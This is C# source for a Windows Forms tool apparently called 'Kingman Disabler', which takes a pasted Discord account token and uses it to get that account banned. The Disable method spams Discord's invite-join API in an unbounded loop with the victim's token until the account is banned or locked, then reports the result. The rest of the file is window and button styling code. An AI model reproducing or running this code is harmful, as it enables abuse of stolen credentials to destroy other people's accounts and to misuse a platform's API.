using DiscordClient.Class;
using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
namespace DisableToken
{
    public partial class Main : Form
    {
        bool Ban = false;
        public Main()
        {
            InitializeComponent();
            ChangeForm();
            ChangeBtns();
        }

        #region UI
        private const int CS_DropShadow = 0x00020000; // For the shadows

        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.ClassStyle |= CS_DropShadow;
                return cp;
            }
        }

        private void ChangeForm()
        {
            Rectangle r = new Rectangle(0, 0, base.Width, base.Height);
            System.Drawing.Drawing2D.GraphicsPath gp = new System.Drawing.Drawing2D.GraphicsPath();
            int d = 14;
            gp.AddArc(r.X, r.Y, d, d, 180, 90);
            gp.AddArc(r.X + r.Width - d, r.Y, d, d, 270, 90);
            gp.AddArc(r.X + r.Width - d, r.Y + r.Height - d, d, d, 0, 90);
            gp.AddArc(r.X, r.Y + r.Height - d, d, d, 90, 90);
            base.Region = new Region(gp);
        }

        private void ChangeBtns()
        {
            ChangeBtn1();
            ChangeBtn2();
        }

        private void ChangeBtn1()
        {
            Rectangle r = new Rectangle(0, 0, DisableTokenBtn.Width, DisableTokenBtn.Height);
            System.Drawing.Drawing2D.GraphicsPath gp = new System.Drawing.Drawing2D.GraphicsPath();
            int d = 16;
            gp.AddArc(r.X, r.Y, d, d, 180, 90);
            gp.AddArc(r.X + r.Width - d, r.Y, d, d, 270, 90);
            gp.AddArc(r.X + r.Width - d, r.Y + r.Height - d, d, d, 0, 90);
            gp.AddArc(r.X, r.Y + r.Height - d, d, d, 90, 90);
            DisableTokenBtn.Region = new Region(gp);
        }

        private void ChangeBtn2()
        {
            Rectangle r = new Rectangle(0, 0, CreditsBtn.Width, CreditsBtn.Height);
            System.Drawing.Drawing2D.GraphicsPath gp = new System.Drawing.Drawing2D.GraphicsPath();
            int d = 20;
            gp.AddArc(r.X, r.Y, d, d, 180, 90);
            gp.AddArc(r.X + r.Width - d, r.Y, d, d, 270, 90);
            gp.AddArc(r.X + r.Width - d, r.Y + r.Height - d, d, d, 0, 90);
            gp.AddArc(r.X, r.Y + r.Height - d, d, d, 90, 90);
            CreditsBtn.Region = new Region(gp);
        }

        private void btnClose_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void btnMini_Click(object sender, EventArgs e)
        {
            base.WindowState = FormWindowState.Minimized;
        }

        private void HeadPnl_MouseDown(object sender, MouseEventArgs e)
        {
            Mouse.x = Control.MousePosition.X - base.Location.X;
            Mouse.y = Control.MousePosition.Y - base.Location.Y;
        }

        private void HeadPnl_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                Mouse.newpoint = Control.MousePosition;
                Mouse.newpoint.X -= Mouse.x;
                Mouse.newpoint.Y -= Mouse.y;
                base.Location = Mouse.newpoint;
            }
        }

        private void HeadServerLbl_MouseDown(object sender, MouseEventArgs e)
        {
            Mouse.x = Control.MousePosition.X - base.Location.X;
            Mouse.y = Control.MousePosition.Y - base.Location.Y;
        }

        private void HeadServerLbl_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                Mouse.newpoint = Control.MousePosition;
                Mouse.newpoint.X -= Mouse.x;
                Mouse.newpoint.Y -= Mouse.y;
                base.Location = Mouse.newpoint;
            }
        }

        private void CreditsBtn_Click(object sender, EventArgs e)
        {
            Process.Start("https://discord.gg/AsZydbatSr");
        }
        #endregion

        #region Disabler
        private void TokenTxt_Enter(object sender, EventArgs e)
        {
            if (TokenTxt.Text == "Token here...")
            {
                TokenTxt.Text = "";
                TokenTxt.ForeColor = System.Drawing.Color.White;
            }
        }

        private void TokenTxt_Leave(object sender, EventArgs e)
        {
            if (TokenTxt.Text == "")
            {
                TokenTxt.Text = "Token here...";
                TokenTxt.ForeColor = System.Drawing.Color.DarkGray;
            }
        }

        private void TokenTxt_TextChanged(object sender, EventArgs e)
        {
            if (TokenTxt.Text == "" || string.IsNullOrEmpty(TokenTxt.Text))
            {
                return;
            }
            try
            {
                API.GetInfos.GetClient(API.Client.CreateClient(TokenTxt.Text));
                if (API.GetInfos.NotValid)
                {
                    UserLbl.Text = "InValid...";
                }
                else
                {
                    UserLbl.Text = API.GetInfos.Username + "#" + API.GetInfos.Discriminator;
                }
            }
            catch
            {
                UserLbl.Text = "N/A";
            }
        }

        private void Disable(string _Token)
        {
            Ban = true;
            new Thread(() =>
            {
                while(Ban)
                {
                    try
                    {
                        var client = new WebClient();
                        var values = new NameValueCollection();
                        client.Headers["authorization"] = _Token;
                        var RequestInfos = client.UploadValues("https://discord.com/api/v8/invites/AsZydbatSr", values);
                    }
                    catch (WebException ex)
                    {
                        var Response = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
                        if (Response.Contains("401: Unauthorized"))
                        {
                            Ban = false;
                            MessageBox.Show($"{UserLbl.Text} got Banned", "Kingman Disabler");
                            return;
                        }
                        if (Response.Contains("Locked Needs Verify."))
                        {
                            Ban = false;
                            MessageBox.Show($"{UserLbl.Text} got Locked\n\nAccount need to be verified", "Kingman Disabler");
                            return;
                        }
                    }
                }
            }).Start();       
        }

        private void DisableTokenBtn_Click(object sender, EventArgs e)
        {
            if(string.IsNullOrEmpty(TokenTxt.Text))
            {
                MessageBox.Show("Paste a Token first!", "Kingman Disabler");
                return;
            }
            if (UserLbl.Text == "N/A")
            {
                MessageBox.Show("Paste a Token first!", "Kingman Disabler");
                return;
            }
            if (UserLbl.Text == "Not Valid...")
            {
                MessageBox.Show("You cant ban an Invalid Token!", "Kingman Disabler");
                return;
            }
            Disable(TokenTxt.Text);
        }

        #endregion

        private void Main_Load(object sender, EventArgs e)
        {
        }

        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void HeadPnl_Paint(object sender, PaintEventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}
